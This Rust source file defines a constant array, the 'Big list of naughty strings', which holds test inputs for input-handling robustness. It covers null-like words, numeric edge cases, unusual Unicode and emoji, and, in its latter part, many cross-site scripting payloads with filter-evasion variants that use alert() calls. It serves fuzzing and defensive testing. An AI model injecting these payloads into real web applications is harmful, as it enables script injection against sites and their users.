/// Big list of naughty strings.
pub const BLNS: &'static [&'static str] = &[
    "",
    "undefined",
    "undef",
    "null",
    "NULL",
    "(null)",
    "nil",
    "NIL",
    "true",
    "false",
    "True",
    "False",
    "TRUE",
    "FALSE",
    "None",
    "hasOwnProperty",
    "then",
    "\\",
    "\\\\",
    "0",
    "1",
    "1.00",
    "$1.00",
    "1/2",
    "1E2",
    "1E02",
    "1E+02",
    "-1",
    "-1.00",
    "-$1.00",
    "-1/2",
    "-1E2",
    "-1E02",
    "-1E+02",
    "1/0",
    "0/0",
    "-2147483648/-1",
    "-9223372036854775808/-1",
    "-0",
    "-0.0",
    "+0",
    "+0.0",
    "0.00",
    "0..0",
    ".",
    "0.0.0",
    "0,00",
    "0,,0",
    ",",
    "0,0,0",
    "0.0/0",
    "1.0/0.0",
    "0.0/0.0",
    "1,0/0,0",
    "0,0/0,0",
    "--1",
    "-",
    "-.",
    "-,",
    "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
    "NaN",
    "Infinity",
    "-Infinity",
    "INF",
    "1#INF",
    "-1#IND",
    "1#QNAN",
    "1#SNAN",
    "1#IND",
    "0x0",
    "0xffffffff",
    "0xffffffffffffffff",
    "0xabad1dea",
    "123456789012345678901234567890123456789",
    "1,000.00",
    "1 000.00",
    "1\'000.00",
    "1,000,000.00",
    "1 000 000.00",
    "1\'000\'000.00",
    "1.000,00",
    "1 000,00",
    "1\'000,00",
    "1.000.000,00",
    "1 000 000,00",
    "1\'000\'000,00",
    "01000",
    "08",
    "09",
    "2.2250738585072011e-308",
    ",./;\'[]\\-=",
    "<>?:\"{}|_+",
    "!@#$%^&*()`~",
    "\u{1}\u{2}\u{3}\u{4}\u{5}\u{6}\u{7}\u{8}\u{e}\u{f}\u{10}\u{11}\u{12}\u{13}\u{14}\u{15}\u{16}\u{17}\u{18}\u{19}\u{1a}\u{1b}\u{1c}\u{1d}\u{1e}\u{1f}\u{7f}",
    "\u{80}\u{81}\u{82}\u{83}\u{84}\u{86}\u{87}\u{88}\u{89}\u{8a}\u{8b}\u{8c}\u{8d}\u{8e}\u{8f}\u{90}\u{91}\u{92}\u{93}\u{94}\u{95}\u{96}\u{97}\u{98}\u{99}\u{9a}\u{9b}\u{9c}\u{9d}\u{9e}\u{9f}",
    "\t\u{b}\u{c} \u{85}\u{a0}\u{1680}\u{2002}\u{2003}\u{2002}\u{2003}\u{2004}\u{2005}\u{2006}\u{2007}\u{2008}\u{2009}\u{200a}\u{200b}\u{2028}\u{2029}\u{202f}\u{205f}\u{3000}",
    "\u{ad}\u{600}\u{601}\u{602}\u{603}\u{604}\u{605}\u{61c}\u{6dd}\u{70f}\u{180e}\u{200b}\u{200c}\u{200d}\u{200e}\u{200f}\u{202a}\u{202b}\u{202c}\u{202d}\u{202e}\u{2060}\u{2061}\u{2062}\u{2063}\u{2064}\u{2066}\u{2067}\u{2068}\u{2069}\u{206a}\u{206b}\u{206c}\u{206d}\u{206e}\u{206f}\u{feff}\u{fff9}\u{fffa}\u{fffb}\u{110bd}\u{1bca0}\u{1bca1}\u{1bca2}\u{1bca3}\u{1d173}\u{1d174}\u{1d175}\u{1d176}\u{1d177}\u{1d178}\u{1d179}\u{1d17a}\u{e0001}\u{e0020}\u{e0021}\u{e0022}\u{e0023}\u{e0024}\u{e0025}\u{e0026}\u{e0027}\u{e0028}\u{e0029}\u{e002a}\u{e002b}\u{e002c}\u{e002d}\u{e002e}\u{e002f}\u{e0030}\u{e0031}\u{e0032}\u{e0033}\u{e0034}\u{e0035}\u{e0036}\u{e0037}\u{e0038}\u{e0039}\u{e003a}\u{e003b}\u{e003c}\u{e003d}\u{e003e}\u{e003f}\u{e0040}\u{e0041}\u{e0042}\u{e0043}\u{e0044}\u{e0045}\u{e0046}\u{e0047}\u{e0048}\u{e0049}\u{e004a}\u{e004b}\u{e004c}\u{e004d}\u{e004e}\u{e004f}\u{e0050}\u{e0051}\u{e0052}\u{e0053}\u{e0054}\u{e0055}\u{e0056}\u{e0057}\u{e0058}\u{e0059}\u{e005a}\u{e005b}\u{e005c}\u{e005d}\u{e005e}\u{e005f}\u{e0060}\u{e0061}\u{e0062}\u{e0063}\u{e0064}\u{e0065}\u{e0066}\u{e0067}\u{e0068}\u{e0069}\u{e006a}\u{e006b}\u{e006c}\u{e006d}\u{e006e}\u{e006f}\u{e0070}\u{e0071}\u{e0072}\u{e0073}\u{e0074}\u{e0075}\u{e0076}\u{e0077}\u{e0078}\u{e0079}\u{e007a}\u{e007b}\u{e007c}\u{e007d}\u{e007e}\u{e007f}",
    "\u{feff}",
    "\u{fffe}",
    "Ω≈ç√∫˜µ≤≥÷",
    "åß∂ƒ©˙∆˚¬…æ",
    "œ∑´®†¥¨ˆøπ“‘",
    "¡™£¢∞§¶•ªº–≠",
    "¸˛Ç◊ı˜Â¯˘¿",
    "ÅÍÎÏ˝ÓÔ\u{f8ff}ÒÚÆ☃",
    "Œ„´‰ˇÁ¨ˆØ∏”’",
    "`⁄€‹›ﬁﬂ‡°·‚—±",
    "⅛⅜⅝⅞",
    "ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя",
    "٠١٢٣٤٥٦٧٨٩",
    "⁰⁴⁵",
    "₀₁₂",
    "⁰⁴⁵₀₁₂",
    "ด\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47} ด\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47} ด\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}\u{e47}\u{e49}\u{e49}\u{e49}\u{e49}\u{e49}\u{e47}\u{e47}\u{e47}\u{e47}",
    "\'",
    "\"",
    "\'\'",
    "\"\"",
    "\'\"\'",
    "\"\'\'\'\'\"\'\"",
    "\"\'\"\'\"\'\'\'\'\"",
    "<foo val=“bar” />",
    "<foo val=“bar” />",
    "<foo val=”bar“ />",
    "<foo val=`bar\' />",
    "田中さんにあげて下さい",
    "パーティーへ行かないか",
    "和製漢語",
    "部落格",
    "사회과학원 어학연구소",
    "찦차를 타고 온 펲시맨과 쑛다리 똠방각하",
    "社會科學院語學研究所",
    "울란바토르",
    "𠜎𠜱𠝹𠱓𠱸𠲖𠳏",
    "𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖𐐇𐐤𐐓𐐝 𐐱𐑂 𐑄 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐏𐐆𐐅𐐤𐐆𐐚𐐊𐐡𐐝𐐆𐐓𐐆",
    "表ポあA鷗ŒéＢ逍Üßªąñ丂㐀𠀀",
    "Ⱥ",
    "Ⱦ",
    "ヽ༼ຈل\u{35c}ຈ༽ﾉ ヽ༼ຈل\u{35c}ຈ༽ﾉ",
    "(｡◕ ∀ ◕｡)",
    "｀ｨ(´∀｀∩",
    "__ﾛ(,_,*)",
    "・(￣∀￣)・:*:",
    "\u{ff9f}･✿ヾ╲(｡◕‿◕｡)╱✿･\u{ff9f}",
    ",。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’",
    "(╯°□°）╯︵ ┻━┻)",
    "(ﾉಥ益ಥ）ﾉ\u{feff} ┻━┻",
    "┬─┬ノ( º _ ºノ)",
    "( \u{361}° \u{35c}ʖ \u{361}°)",
    "¯\\_(ツ)_/¯",
    "😍",
    "👩🏽",
    "👨\u{200d}🦰 👨🏿\u{200d}🦰 👨\u{200d}🦱 👨🏿\u{200d}🦱 🦹🏿\u{200d}♂\u{fe0f}",
    "👾 🙇 💁 🙅 🙆 🙋 🙎 🙍",
    "🐵 🙈 🙉 🙊",
    "❤\u{fe0f} 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙",
    "✋🏿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿",
    "👨\u{200d}👩\u{200d}👦 👨\u{200d}👩\u{200d}👧\u{200d}👦 👨\u{200d}👨\u{200d}👦 👩\u{200d}👩\u{200d}👧 👨\u{200d}👦 👨\u{200d}👧\u{200d}👦 👩\u{200d}👦 👩\u{200d}👧\u{200d}👦",
    "🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧",
    "0\u{fe0f}\u{20e3} 1\u{fe0f}\u{20e3} 2\u{fe0f}\u{20e3} 3\u{fe0f}\u{20e3} 4\u{fe0f}\u{20e3} 5\u{fe0f}\u{20e3} 6\u{fe0f}\u{20e3} 7\u{fe0f}\u{20e3} 8\u{fe0f}\u{20e3} 9\u{fe0f}\u{20e3} 🔟",
    "🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸",
    "🇺🇸🇷🇺🇸🇦🇫🇦🇲",
    "🇺🇸🇷🇺🇸🇦",
    "１２３",
    "١٢٣",
    "ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أه\u{651}ل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو.",
    "ב\u{5b0}\u{5bc}ר\u{5b5}אש\u{5b4}\u{5c1}ית, ב\u{5b8}\u{5bc}ר\u{5b8}א א\u{5b1}ל\u{5b9}ה\u{5b4}ים, א\u{5b5}ת ה\u{5b7}ש\u{5b8}\u{5bc}\u{5c1}מ\u{5b7}י\u{5b4}ם, ו\u{5b0}א\u{5b5}ת ה\u{5b8}א\u{5b8}ר\u{5b6}ץ",
    "ה\u{5b8}י\u{5b0}ת\u{5b8}הtestالصفحات الت\u{651}حول",
    "﷽",
    "ﷺ",
    "م\u{64f}ن\u{64e}اق\u{64e}ش\u{64e}ة\u{64f} س\u{64f}ب\u{64f}ل\u{650} ا\u{650}س\u{652}ت\u{650}خ\u{652}د\u{64e}ام\u{650} الل\u{64f}\u{651}غ\u{64e}ة\u{650} ف\u{650}ي الن\u{64f}\u{651}ظ\u{64f}م\u{650} ال\u{652}ق\u{64e}ائ\u{650}م\u{64e}ة\u{650} و\u{64e}ف\u{650}يم ي\u{64e}خ\u{64f}ص\u{64e}\u{651} الت\u{64e}\u{651}ط\u{652}ب\u{650}يق\u{64e}ات\u{64f} ال\u{652}حاس\u{64f}وب\u{650}ي\u{64e}\u{651}ة\u{64f}، ",
    "᚛ᚄᚓᚐᚋᚒᚄ\u{1680}ᚑᚄᚂᚑᚏᚅ᚜\u{202a}\u{202a}\u{202a}",
    "\u{202a}\u{202a}᚛\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}\u{1680}᚜\u{202a}",
    "\u{202a}\u{202a}test\u{202a}",
    "\u{202b}test\u{202b}",
    "\u{2029}test\u{2029}",
    "test\u{2060}test\u{202b}",
    "\u{2066}test\u{2067}",
    "Ṱ\u{33a}\u{33a}\u{315}o\u{35e} \u{337}i\u{332}\u{32c}\u{347}\u{32a}\u{359}n\u{31d}\u{317}\u{355}v\u{31f}\u{31c}\u{318}\u{326}\u{35f}o\u{336}\u{319}\u{330}\u{320}kè\u{35a}\u{32e}\u{33a}\u{32a}\u{339}\u{331}\u{324} \u{316}t\u{31d}\u{355}\u{333}\u{323}\u{33b}\u{32a}\u{35e}h\u{33c}\u{353}\u{332}\u{326}\u{333}\u{318}\u{332}e\u{347}\u{323}\u{330}\u{326}\u{32c}\u{34e} \u{322}\u{33c}\u{33b}\u{331}\u{318}h\u{35a}\u{34e}\u{359}\u{31c}\u{323}\u{332}\u{345}i\u{326}\u{332}\u{323}\u{330}\u{324}v\u{33b}\u{34d}e\u{33a}\u{32d}\u{333}\u{32a}\u{330}-m\u{322}i\u{345}n\u{316}\u{33a}\u{31e}\u{332}\u{32f}\u{330}d\u{335}\u{33c}\u{31f}\u{359}\u{329}\u{33c}\u{318}\u{333} \u{31e}\u{325}\u{331}\u{333}\u{32d}r\u{31b}\u{317}\u{318}e\u{359}p\u{360}r\u{33c}\u{31e}\u{33b}\u{32d}\u{317}e\u{33a}\u{320}\u{323}\u{35f}s\u{318}\u{347}\u{333}\u{34d}\u{31d}\u{349}e\u{349}\u{325}\u{32f}\u{31e}\u{332}\u{35a}\u{32c}\u{35c}ǹ\u{32c}\u{34e}\u{34e}\u{31f}\u{316}\u{347}\u{324}t\u{34d}\u{32c}\u{324}\u{353}\u{33c}\u{32d}\u{358}\u{345}i\u{32a}\u{331}n\u{360}g\u{334}\u{349} \u{34f}\u{349}\u{345}c\u{32c}\u{31f}h\u{361}a\u{32b}\u{33b}\u{32f}\u{358}o\u{32b}\u{31f}\u{316}\u{34d}\u{319}\u{31d}\u{349}s\u{317}\u{326}\u{332}.\u{328}\u{339}\u{348}\u{323}",
    "\u{321}\u{353}\u{31e}\u{345}I\u{317}\u{318}\u{326}\u{35d}n\u{347}\u{347}\u{359}v\u{32e}\u{32b}ok\u{332}\u{32b}\u{319}\u{348}i\u{316}\u{359}\u{32d}\u{339}\u{320}\u{31e}n\u{321}\u{33b}\u{32e}\u{323}\u{33a}g\u{332}\u{348}\u{359}\u{32d}\u{359}\u{32c}\u{34e} \u{330}t\u{354}\u{326}h\u{31e}\u{332}e\u{322}\u{324} \u{34d}\u{32c}\u{332}\u{356}f\u{334}\u{318}\u{355}\u{323}è\u{356}ẹ\u{325}\u{329}l\u{356}\u{354}\u{35a}i\u{353}\u{35a}\u{326}\u{360}n\u{356}\u{34d}\u{317}\u{353}\u{333}\u{32e}g\u{34d} \u{328}o\u{35a}\u{32a}\u{361}f\u{318}\u{323}\u{32c} \u{316}\u{318}\u{356}\u{31f}\u{359}\u{32e}c\u{489}\u{354}\u{32b}\u{356}\u{353}\u{347}\u{356}\u{345}h\u{335}\u{324}\u{323}\u{35a}\u{354}á\u{317}\u{33c}\u{355}\u{345}o\u{33c}\u{323}\u{325}s\u{331}\u{348}\u{33a}\u{316}\u{326}\u{33b}\u{362}.\u{31b}\u{316}\u{31e}\u{320}\u{32b}\u{330}",
    "\u{317}\u{33a}\u{356}\u{339}\u{32f}\u{353}Ṯ\u{324}\u{34d}\u{325}\u{347}\u{348}h\u{332}\u{301}e\u{34f}\u{353}\u{33c}\u{317}\u{319}\u{33c}\u{323}\u{354} \u{347}\u{31c}\u{331}\u{320}\u{353}\u{34d}\u{345}N\u{355}\u{360}e\u{317}\u{331}z\u{318}\u{31d}\u{31c}\u{33a}\u{359}p\u{324}\u{33a}\u{339}\u{34d}\u{32f}\u{35a}e\u{320}\u{33b}\u{320}\u{35c}r\u{328}\u{324}\u{34d}\u{33a}\u{316}\u{354}\u{316}\u{316}d\u{320}\u{31f}\u{32d}\u{32c}\u{31d}\u{35f}i\u{326}\u{356}\u{329}\u{353}\u{354}\u{324}a\u{320}\u{317}\u{32c}\u{349}\u{319}n\u{35a}\u{35c} \u{33b}\u{31e}\u{330}\u{35a}\u{345}h\u{335}\u{349}i\u{333}\u{31e}v\u{322}\u{347}ḙ\u{34e}\u{35f}-\u{489}\u{32d}\u{329}\u{33c}\u{354}m\u{324}\u{32d}\u{32b}i\u{355}\u{347}\u{31d}\u{326}n\u{317}\u{359}ḍ\u{31f} \u{32f}\u{332}\u{355}\u{35e}ǫ\u{31f}\u{32f}\u{330}\u{332}\u{359}\u{33b}\u{31d}f \u{32a}\u{330}\u{330}\u{317}\u{316}\u{32d}\u{318}\u{358}c\u{326}\u{34d}\u{332}\u{31e}\u{34d}\u{329}\u{319}ḥ\u{35a}a\u{32e}\u{34e}\u{31f}\u{319}\u{35c}ơ\u{329}\u{339}\u{34e}s\u{324}.\u{31d}\u{31d} \u{489}Z\u{321}\u{316}\u{31c}\u{356}\u{330}\u{323}\u{349}\u{31c}a\u{356}\u{330}\u{359}\u{32c}\u{361}l\u{332}\u{32b}\u{333}\u{34d}\u{329}g\u{321}\u{31f}\u{33c}\u{331}\u{35a}\u{31e}\u{32c}\u{345}o\u{317}\u{35c}.\u{31f}",
    "\u{326}H\u{32c}\u{324}\u{317}\u{324}\u{35d}e\u{35c} \u{31c}\u{325}\u{31d}\u{33b}\u{34d}\u{31f}\u{301}w\u{315}h\u{316}\u{32f}\u{353}o\u{31d}\u{359}\u{316}\u{34e}\u{331}\u{32e} \u{489}\u{33a}\u{319}\u{31e}\u{31f}\u{348}W\u{337}\u{33c}\u{32d}a\u{33a}\u{32a}\u{34d}į\u{348}\u{355}\u{32d}\u{359}\u{32f}\u{31c}t\u{336}\u{33c}\u{32e}s\u{318}\u{359}\u{356}\u{315} \u{320}\u{32b}\u{320}B\u{33b}\u{34d}\u{359}\u{349}\u{333}\u{345}e\u{335}h\u{335}\u{32c}\u{347}\u{32b}\u{359}i\u{339}\u{353}\u{333}\u{333}\u{32e}\u{34e}\u{32b}\u{315}n\u{35f}d\u{334}\u{32a}\u{31c}\u{316} \u{330}\u{349}\u{329}\u{347}\u{359}\u{332}\u{35e}\u{345}T\u{356}\u{33c}\u{353}\u{32a}\u{362}h\u{34f}\u{353}\u{32e}\u{33b}e\u{32c}\u{31d}\u{31f}\u{345} \u{324}\u{339}\u{31d}W\u{359}\u{31e}\u{31d}\u{354}\u{347}\u{35d}\u{345}a\u{34f}\u{353}\u{354}\u{339}\u{33c}\u{323}l\u{334}\u{354}\u{330}\u{324}\u{31f}\u{354}ḽ\u{32b}.\u{355}",
    "Z\u{32e}\u{31e}\u{320}\u{359}\u{354}\u{345}Ḁ\u{317}\u{31e}\u{348}\u{33b}\u{317}Ḷ\u{359}\u{34e}\u{32f}\u{339}\u{31e}\u{353}G\u{33b}O\u{32d}\u{317}\u{32e}",
    "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs \'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ \'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥",
    "00˙Ɩ$-",
    "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ",
    "𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠",
    "𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌",
    "𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐𝒘𝒏 𝒇𝒐𝒙 𝒋𝒖𝒎𝒑𝒔 𝒐𝒗𝒆𝒓 𝒕𝒉𝒆 𝒍𝒂𝒛𝒚 𝒅𝒐𝒈",
    "𝓣𝓱𝓮 𝓺𝓾𝓲𝓬𝓴 𝓫𝓻𝓸𝔀𝓷 𝓯𝓸𝔁 𝓳𝓾𝓶𝓹𝓼 𝓸𝓿𝓮𝓻 𝓽𝓱𝓮 𝓵𝓪𝔃𝔂 𝓭𝓸𝓰",
    "𝕋𝕙𝕖 𝕢𝕦𝕚𝕔𝕜 𝕓𝕣𝕠𝕨𝕟 𝕗𝕠𝕩 𝕛𝕦𝕞𝕡𝕤 𝕠𝕧𝕖𝕣 𝕥𝕙𝕖 𝕝𝕒𝕫𝕪 𝕕𝕠𝕘",
    "𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐",
    "⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢",
    "<script>alert(123)</script>",
    "&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;",
    "<img src=x onerror=alert(123) />",
    "<svg><script>123<1>alert(123)</script>",
    "\"><script>alert(123)</script>",
    "\'><script>alert(123)</script>",
    "><script>alert(123)</script>",
    "</script><script>alert(123)</script>",
    "< / script >< script >alert(123)< / script >",
    " onfocus=JaVaSCript:alert(123) autofocus",
    "\" onfocus=JaVaSCript:alert(123) autofocus",
    "\' onfocus=JaVaSCript:alert(123) autofocus",
    "＜script＞alert(123)＜/script＞",
    "<sc<script>ript>alert(123)</sc</script>ript>",
    "--><script>alert(123)</script>",
    "\";alert(123);t=\"",
    "\';alert(123);t=\'",
    "JavaSCript:alert(123)",
    ";alert(123);",
    "src=JaVaSCript:prompt(132)",
    "\"><script>alert(123);</script x=\"",
    "\'><script>alert(123);</script x=\'",
    "><script>alert(123);</script x=",
    "\" autofocus onkeyup=\"javascript:alert(123)",
    "\' autofocus onkeyup=\'javascript:alert(123)",
    "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
    "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
    "\'`\"><\\x3Cscript>javascript:alert(1)</script>",
    "\'`\"><\\x00script>javascript:alert(1)</script>",
    "ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF",
    "ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF",
    "<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
